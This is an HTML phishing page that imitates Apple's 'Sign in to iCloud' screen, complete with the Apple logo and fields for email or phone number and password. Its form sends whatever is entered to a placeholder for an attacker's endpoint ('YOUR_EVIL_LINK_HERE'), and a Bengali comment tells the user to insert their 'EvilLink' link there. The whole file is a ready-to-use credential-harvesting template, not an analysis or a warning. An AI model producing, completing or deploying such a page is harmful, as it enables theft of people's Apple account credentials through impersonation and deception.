<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>iCloud</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        img { width: 50px; margin-bottom: 10px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #007aff; color: white; border: none; padding: 10px 20px; border-radius: 5px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
        <h2>Sign in to iCloud</h2>
        <!-- EvilLink এর লিংকটি এখানে বসান -->
        <form action="YOUR_EVIL_LINK_HERE" method="POST">
            <input type="text" name="email" placeholder="Email or Phone Number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
